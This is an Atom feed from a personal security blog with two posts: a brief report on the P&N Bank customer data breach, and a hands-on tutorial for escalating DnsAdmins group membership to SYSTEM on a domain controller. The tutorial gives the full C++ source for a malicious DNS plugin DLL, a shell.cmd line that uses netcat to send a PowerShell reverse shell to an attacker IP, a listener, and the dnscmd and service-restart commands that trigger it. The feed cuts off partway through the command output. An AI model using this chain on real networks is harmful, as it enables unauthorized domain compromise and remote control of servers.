<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="https://sabebarker.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://sabebarker.com/" rel="alternate" type="text/html" /><updated>2020-02-21T23:42:57+08:00</updated><id>https://sabebarker.com/feed.xml</id><title type="html">Sabe Barker</title><subtitle>A cybersecurity and computer forensics enthusiast who likes to think of themself as a privacy advocate. Checkout my blog and writeups or browse the tools directory.</subtitle><author><name>Sabe Barker</name></author><entry><title type="html">P&amp;amp;N Bank Information Breach</title><link href="https://sabebarker.com/blog/p-and-n-bank-information-data-breach/" rel="alternate" type="text/html" title="P&amp;N Bank Information Breach" /><published>2020-01-15T00:00:00+08:00</published><updated>2020-01-15T00:00:00+08:00</updated><id>https://sabebarker.com/blog/p-and-n-bank-information-data-breach</id><content type="html" xml:base="https://sabebarker.com/blog/p-and-n-bank-information-data-breach/">&lt;p&gt;The email states that P&amp;amp;N are &lt;em&gt;“working closely with the West Australian Police Force (WAPOL) and relevant federal authorities”&lt;/em&gt; to investigate the online criminal activity.&lt;/p&gt;

&lt;p&gt;The breach occured around the 12 December 2019 via an attack during a server upgrade.&lt;/p&gt;

&lt;p&gt;Customers are being urged to stay vigilant as this data will undoubtedly be used in banking scams in the near future.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/p-and-n-bank-information-data-breach/P-and-N-Bank_information_breach_email.png&quot; data-toggle=&quot;lightbox&quot;&gt;&lt;img src=&quot;/assets/img/blog/p-and-n-bank-information-data-breach/P-and-N-Bank_information_breach_email.png&quot; alt=&quot;P&amp;amp;N Bank Information Breach Email Screenshot&quot; class=&quot;img-fluid&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;what-data-has-been-compromised&quot;&gt;What data &lt;em&gt;has&lt;/em&gt; been compromised?&lt;/h3&gt;

&lt;p&gt;P&amp;amp;N mentions that the data pertaining to the breached systems contained personal information such as customers names, addresses, emails, phone numbers as well as their customer number, age, account number and account balance.&lt;/p&gt;

&lt;p&gt;Which is quite the list!&lt;/p&gt;

&lt;p&gt;Other &lt;em&gt;“non-sensitive”&lt;/em&gt; information was also compromised but the exact data has not been disclosed. This may be in reference to customer notes that are taken by P&amp;amp;N representatives during customer phone calls since it was their customer relationship management system that was breached which usually contains such information.&lt;/p&gt;

&lt;p&gt;However, customers may have something to say about that apparently being &lt;em&gt;“non-sensitive”&lt;/em&gt; information.&lt;/p&gt;

&lt;h3 id=&quot;what-data-has-not-been-compromised&quot;&gt;What data has &lt;em&gt;not&lt;/em&gt; been compromised?&lt;/h3&gt;

&lt;p&gt;P&amp;amp;N goes on to explain that customers passwords, Driver’s License numbers, Passport numbers, Social Security numbers, Tax File numbers, Credit Card numbers, birthdates, or any other sensitive or health information was not compromised.&lt;/p&gt;

&lt;p&gt;They go on to state that the breach &lt;em&gt;has not&lt;/em&gt; caused the loss of any customer funds, nor enabled third parties to access customer credit card details and that banking passwords &lt;em&gt;have not&lt;/em&gt; been compromised.&lt;/p&gt;

&lt;h3 id=&quot;disclosure&quot;&gt;Disclosure&lt;/h3&gt;

&lt;p&gt;A question that should be asked is whether customer respresentative notes taken during customer calls were indeed on the compromised systems as sensitive information may have inadvertently been placed in notes which could possibly be things like health information. Such information could cause issues for customers both professionally and personally if that data was to be exposed.&lt;/p&gt;

&lt;p&gt;One thing is for sure. P&amp;amp;N Customers can expect a flood of spam letters, emails and calls using an abundance of accurate personal information. This will certainly make it hard for some customers to recognise a scam. Hopefully P&amp;amp;N is ready for more than a few irrate customers.&lt;/p&gt;</content><author><name>Sabe Barker</name></author><summary type="html">The P&amp;N Bank has emailed customers today regarding an information breach of it's customers</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://sabebarker.com/assets/img/blog/p-and-n-bank-information-data-breach/p-and-n_breach.png" /><media:content medium="image" url="https://sabebarker.com/assets/img/blog/p-and-n-bank-information-data-breach/p-and-n_breach.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">DNSAdmin to Domain Controller Compromise</title><link href="https://sabebarker.com/blog/dnsadmin-to-domain-controller-compromise/" rel="alternate" type="text/html" title="DNSAdmin to Domain Controller Compromise" /><published>2020-01-09T00:00:00+08:00</published><updated>2020-01-09T00:00:00+08:00</updated><id>https://sabebarker.com/blog/dnsadmin-to-domain-controller-compromise</id><content type="html" xml:base="https://sabebarker.com/blog/dnsadmin-to-domain-controller-compromise/">&lt;p&gt;This issue was first published by &lt;a href=&quot;https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83&quot;&gt;Shay Ber&lt;/a&gt; back in 2017. I recently had to use this “feature” for privilege escalation and during that process I found that the part where we need to execute the &lt;code class=&quot;highlighter-rouge&quot;&gt;DLL&lt;/code&gt; can be troublesome to say the least. This seems to be due to the fact that the &lt;code class=&quot;highlighter-rouge&quot;&gt;DNS&lt;/code&gt; service crashes and needs to be restarted. However, this can be more than temperamental.&lt;/p&gt;

&lt;p&gt;I will point out that this post in no way is meant to add anything new to the process of the compromise but more of a notebook of how to create a working &lt;code class=&quot;highlighter-rouge&quot;&gt;DLL&lt;/code&gt; and how to get the bloody thing to actually execute successfully. I found that when researching this issue many people I spoke to had attempted to create a custom working &lt;code class=&quot;highlighter-rouge&quot;&gt;DLL&lt;/code&gt; but ended up resorting to creation with &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt;. Me being me I wasn’t happy to stop there as the &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; created &lt;code class=&quot;highlighter-rouge&quot;&gt;DLL&lt;/code&gt; cannot be used locally on the machine as &lt;em&gt;Windows Defender&lt;/em&gt; will nuke it. So if for whatever reason you cannot access the &lt;code class=&quot;highlighter-rouge&quot;&gt;DLL&lt;/code&gt; remotely you wouldn’t be able to obtain that beautiful &lt;em&gt;system&lt;/em&gt; shell we desire so much.&lt;/p&gt;

&lt;p&gt;Now before we start I will just do the usual spiel: &lt;em&gt;This post is for educational purposes and I take no responsibility for any misuse of the information provided herein. Under no circumstances should you perform these actions on a system without prior consent from the owner.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Enough with the banter let’s get our hands dirty!&lt;/p&gt;

&lt;p&gt;First off we will download the &lt;a href=&quot;https://visualstudio.microsoft.com/downloads/&quot;&gt;Visual Studio 2019 Preview&lt;/a&gt;. I used the &lt;em&gt;Professional&lt;/em&gt; version which you can get a “free” trial. Once downloaded go through the installation process and then open our program.&lt;/p&gt;

&lt;p&gt;On the &lt;code class=&quot;highlighter-rouge&quot;&gt;Get started&lt;/code&gt; window select &lt;code class=&quot;highlighter-rouge&quot;&gt;Create a new project&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/dnsadmin-to-domain-controller-compromise/vs-getstarted.png&quot; data-toggle=&quot;lightbox&quot;&gt;&lt;img src=&quot;/assets/img/blog/dnsadmin-to-domain-controller-compromise/vs-getstarted.png&quot; alt=&quot;Visual Studio Get Started Screenshot&quot; class=&quot;img-fluid&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We are presented with the &lt;code class=&quot;highlighter-rouge&quot;&gt;Create a new project&lt;/code&gt; window where we will type &lt;code class=&quot;highlighter-rouge&quot;&gt;DLL&lt;/code&gt; in to the search bar and select &lt;code class=&quot;highlighter-rouge&quot;&gt;Dynamic-Link Library with exports (DLL)&lt;/code&gt; then click &lt;code class=&quot;highlighter-rouge&quot;&gt;Next&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/dnsadmin-to-domain-controller-compromise/vs-newproject.png&quot; data-toggle=&quot;lightbox&quot;&gt;&lt;img src=&quot;/assets/img/blog/dnsadmin-to-domain-controller-compromise/vs-newproject.png&quot; alt=&quot;Visual Studio Create Project Screenshot&quot; class=&quot;img-fluid&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Next we enter our &lt;code class=&quot;highlighter-rouge&quot;&gt;Project Name&lt;/code&gt; and click &lt;code class=&quot;highlighter-rouge&quot;&gt;Create&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/dnsadmin-to-domain-controller-compromise/vs-configure.png&quot; data-toggle=&quot;lightbox&quot;&gt;&lt;img src=&quot;/assets/img/blog/dnsadmin-to-domain-controller-compromise/vs-configure.png&quot; alt=&quot;Visual Studio Project Configure Screenshot&quot; class=&quot;img-fluid&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We are presented with a template that includes two files one named &lt;code class=&quot;highlighter-rouge&quot;&gt;dllmain.cpp&lt;/code&gt; and the other &lt;code class=&quot;highlighter-rouge&quot;&gt;DNSAdmin.cpp&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/dnsadmin-to-domain-controller-compromise/vs-template.png&quot; data-toggle=&quot;lightbox&quot;&gt;&lt;img src=&quot;/assets/img/blog/dnsadmin-to-domain-controller-compromise/vs-template.png&quot; alt=&quot;Visual Studio Template Screenshot&quot; class=&quot;img-fluid&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;dllmain.cpp&lt;/code&gt; we will edit to reflect the following code:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span class=&quot;c1&quot;&gt;/// dllmain.cpp : Defines the entry point for the DLL application.&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include &quot;pch.h&quot;
#include &amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;APIENTRY&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DllMain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HMODULE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hModule&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ul_reason_for_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpReserved&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ul_reason_for_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DLL_PROCESS_ATTACH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DLL_THREAD_ATTACH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DLL_THREAD_DETACH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DLL_PROCESS_DETACH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;DNSAdmin.cpp&lt;/code&gt; we will also edit to reflect the following code:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span class=&quot;c1&quot;&gt;// DNSADMIN.cpp : Defines the exported functions for the DLL.&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#include &quot;pch.h&quot;
#include &amp;lt;stdlib.h&amp;gt;
#include &quot;framework.h&quot;
#include &quot;DNSAdmin.h&quot;
&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#define DNS_PLUGIN_API  __declspec ( dllexport )
&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#pragma comment(linker,&quot;/EXPORT:DnsPluginInitialize=?DnsPluginInitialize@@YAHPEAX0@Z&quot;)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DNS_PLUGIN_API&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DnsPluginInitialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Users&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;username&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;shell.cmd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#pragma comment(linker,&quot;/EXPORT:DnsPluginCleanup=?DnsPluginCleanup@@YAHXZ&quot;)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DNS_PLUGIN_API&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DnsPluginCleanup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#pragma comment(linker,&quot;/EXPORT:DnsPluginQuery=?DnsPluginQuery@@YAHPEAX000@Z&quot;)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DNS_PLUGIN_API&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DnsPluginQuery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Ensure you change &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;username&amp;gt;&lt;/code&gt; to the one that is on the &lt;code class=&quot;highlighter-rouge&quot;&gt;victim&lt;/code&gt; machine then save your changes. You will notice a reference to a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;shell.cmd&lt;/code&gt;. This is where we will place our command to execute. In not hardcoding it to the &lt;code class=&quot;highlighter-rouge&quot;&gt;DLL&lt;/code&gt; we can freely change it if need be.&lt;/p&gt;

&lt;p&gt;An explanation of what is going on here can be found at Shay’s &lt;a href=&quot;https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83&quot;&gt;post&lt;/a&gt; that was mentioned earlier.&lt;/p&gt;

&lt;p&gt;Now it’s time to build our &lt;code class=&quot;highlighter-rouge&quot;&gt;DLL&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;From the top menu we will change &lt;code class=&quot;highlighter-rouge&quot;&gt;debug&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;release&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;x32&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;x64&lt;/code&gt; or whichever the arch is for the &lt;code class=&quot;highlighter-rouge&quot;&gt;victim&lt;/code&gt; system:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/dnsadmin-to-domain-controller-compromise/vs-setbuild.png&quot; data-toggle=&quot;lightbox&quot;&gt;&lt;img src=&quot;/assets/img/blog/dnsadmin-to-domain-controller-compromise/vs-setbuild.png&quot; alt=&quot;Visual Studio Set Build Screenshot&quot; class=&quot;img-fluid&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We will then navigate to &lt;code class=&quot;highlighter-rouge&quot;&gt;Build --&amp;gt; Build Solution&lt;/code&gt; in the top menu or type &lt;code class=&quot;highlighter-rouge&quot;&gt;Ctrl+Shift+B&lt;/code&gt; to build our &lt;code class=&quot;highlighter-rouge&quot;&gt;DLL&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/dnsadmin-to-domain-controller-compromise/vs-build.png&quot; data-toggle=&quot;lightbox&quot;&gt;&lt;img src=&quot;/assets/img/blog/dnsadmin-to-domain-controller-compromise/vs-build.png&quot; alt=&quot;Visual Studio Build Screenshot&quot; class=&quot;img-fluid&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If we take a look in the &lt;code class=&quot;highlighter-rouge&quot;&gt;output&lt;/code&gt; section at the bottom of our window we should see that our build succeeded:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/dnsadmin-to-domain-controller-compromise/vs-buildout.png&quot; data-toggle=&quot;lightbox&quot;&gt;&lt;img src=&quot;/assets/img/blog/dnsadmin-to-domain-controller-compromise/vs-buildout.png&quot; alt=&quot;Visual Studio Build Screenshot&quot; class=&quot;img-fluid&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In this output we can also see that our build has been saved at the location &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\&amp;lt;username&amp;gt;\source\repos\DNSAdmin\x64\Release\DNSADMIN.dll&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now lets create our &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; file. Open up your favourite text editor and add the following line saving the file as &lt;code class=&quot;highlighter-rouge&quot;&gt;shell.cmd&lt;/code&gt;:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-posh&quot; data-lang=&quot;posh&quot;&gt;&lt;span class=&quot;nf&quot;&gt;C:\Users\&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\nc.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;attacker-ip&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1234&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;powershell.exe&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Replacing &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;attacker-ip&amp;gt;&lt;/code&gt; with the &lt;code class=&quot;highlighter-rouge&quot;&gt;attacker&lt;/code&gt; machines IP address.&lt;/p&gt;

&lt;p&gt;You will also need to download &lt;code class=&quot;highlighter-rouge&quot;&gt;netcat&lt;/code&gt; for windows which can be found &lt;a href=&quot;https://github.com/diegocr/netcat&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;We should now have three files to work with: &lt;code class=&quot;highlighter-rouge&quot;&gt;DNSADMIN.dll&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;shell.cmd&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now upload/download these files to the &lt;code class=&quot;highlighter-rouge&quot;&gt;victim&lt;/code&gt; machine in to the directory: &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\&amp;lt;username&amp;gt;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Let’s setup our listener for the incoming connection on the &lt;code class=&quot;highlighter-rouge&quot;&gt;attacker&lt;/code&gt; machine:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 1234&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We will then load the &lt;code class=&quot;highlighter-rouge&quot;&gt;DLL&lt;/code&gt; using the &lt;code class=&quot;highlighter-rouge&quot;&gt;dnscmd&lt;/code&gt; command on the &lt;code class=&quot;highlighter-rouge&quot;&gt;victim&lt;/code&gt; machine like so:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-posh&quot; data-lang=&quot;posh&quot;&gt;&lt;span class=&quot;nf&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dnscmd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/config&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/serverlevelplugindll&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;servername&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\C&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\Users\&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\DNSADMIN.dll&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;On success we should see the output:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;Registry property serverlevelplugindll successfully reset.
Command completed successfully.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we have to restart the &lt;code class=&quot;highlighter-rouge&quot;&gt;DNS&lt;/code&gt; service so our &lt;code class=&quot;highlighter-rouge&quot;&gt;DLL&lt;/code&gt; is executed.&lt;/p&gt;

&lt;p&gt;To do so we first stop the service:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-posh&quot; data-lang=&quot;posh&quot;&gt;&lt;span class=&quot;nf&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sc.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stop&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dns&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SERVICE_NAME:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dns&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
        &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;TYPE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;               &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;WIN32_OWN_PROCESS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  
        &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;STATE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;STOP_PENDING&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
                                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;STOPPABLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PAUSABLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ACCEPTS_SHUTDOWN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
